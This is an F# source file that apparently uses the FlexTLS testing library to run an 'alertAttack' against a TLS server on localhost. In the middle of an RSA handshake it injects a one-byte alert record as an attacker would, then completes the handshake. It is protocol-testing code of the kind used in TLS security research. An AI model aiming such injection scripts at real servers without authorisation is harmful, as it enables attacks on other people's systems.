module Attacks

open FlexTypes
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexAlert
open FlexState
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexRecord

open Bytes
open TLSInfo

let alertAttack peer name =
    // Connect to the server
    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,name) in

    // Start a typical RSA handshake with the server
    let st,nsc,ch = FlexClientHello.send(st) in
    let st,nsc,sh = FlexServerHello.receive(st,nsc) in

    // *** Inject a one byte alert on behalf of the attacker ***
    let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in

    // Continue the typical RSA handshake
    let st,nsc,cert = FlexCertificate.receive(st,Client,nsc) in
    let st,shd      = FlexServerHelloDone.receive(st) in
    let st,nsc,cke  = FlexClientKeyExchange.sendRSA(st,nsc,ch) in
    let st,_        = FlexCCS.send(st) in
            
    // Start encrypting
    let st           = FlexState.installWriteKeys st nsc in
    let log          = ch.payload @| sh.payload @| cert.payload @| shd.payload @| cke.payload in
            
    let st,cf       = FlexFinished.send(st, logRoleNSC=(log,Client,nsc)) in
    let st,_        = FlexCCS.receive(st) in

    // Start decrypting
    let st           = FlexState.installReadKeys st nsc in
    // let log       = log @| fcf.payload

    // Check that verify_data is correct
    let st,fsf       = FlexFinished.receive(st) in

    // RSA handshake is over. Send some plaintext
    //let _ = FlexRecord.send()
    ()

[<EntryPoint>]
let main argv = 
    alertAttack "localhost" "localhost"
    0